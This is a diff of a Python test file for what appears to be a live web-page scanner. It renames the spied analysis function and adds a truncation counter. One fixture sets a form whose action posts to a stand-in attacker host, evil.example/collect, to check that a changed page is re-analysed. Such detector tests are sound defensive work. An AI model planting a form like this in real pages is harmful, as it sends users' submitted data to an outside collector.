@@ -227,7 +227,7 @@ def test_concurrent_polls_of_the_same_dom_run_a_single_analysis():
     écrit APRÈS l'analyse, donc 20 appels concurrents le manquent tous."""
     inflight = {"cur": 0, "peak": 0, "total": 0}
     lock = threading.Lock()
-    real = ss.analyze_html
+    real = ss.scan_html
 
     def _spy(html):
         with lock:
@@ -245,11 +245,11 @@ def test_concurrent_polls_of_the_same_dom_run_a_single_analysis():
         _reset_live_state()
         ss._state.update(page=_FakePage("<html><body>même dom</body></html>"),
                          cap=NetworkCapture())
-        ss.analyze_html = _spy
+        ss.scan_html = _spy
         try:
             return await asyncio.gather(*[ss.live() for _ in range(20)])
         finally:
-            ss.analyze_html = real
+            ss.scan_html = real
 
     results = asyncio.run(_scenario())
 
@@ -265,7 +265,7 @@ def test_concurrent_polls_of_the_same_dom_run_a_single_analysis():
 def test_a_changed_dom_is_still_reanalyzed():
     """Non-régression : le single-flight ne doit pas figer l'analyse."""
     calls = {"n": 0}
-    real = ss.analyze_html
+    real = ss.scan_html
 
     def _spy(html):
         calls["n"] += 1
@@ -275,14 +275,14 @@ def test_a_changed_dom_is_still_reanalyzed():
         _reset_live_state()
         page = _FakePage("<html><body>rien</body></html>")
         ss._state.update(page=page, cap=NetworkCapture())
-        ss.analyze_html = _spy
+        ss.scan_html = _spy
         try:
             first = await ss.live()
             page.set_dom('<form action="https://evil.example/collect" method="POST"></form>')
             second = await ss.live()
             return first, second
         finally:
-            ss.analyze_html = real
+            ss.scan_html = real
 
     first, second = asyncio.run(_scenario())
     assert calls["n"] == 2
@@ -307,5 +307,5 @@ def test_a_benign_live_poll_is_unchanged_and_declares_itself_complete(live_clien
     assert data["forms"] == [{"action": "/login", "method": "POST"}]
     assert json.loads(json.dumps(data["truncation"])) == {
         "network_dropped": 0, "console_dropped": 0, "post_data_truncated": 0,
-        "findings_dropped": 0, "text_truncated": 0,
+        "findings_dropped": 0, "text_truncated": 0, "html_chars_dropped": 0,
     }
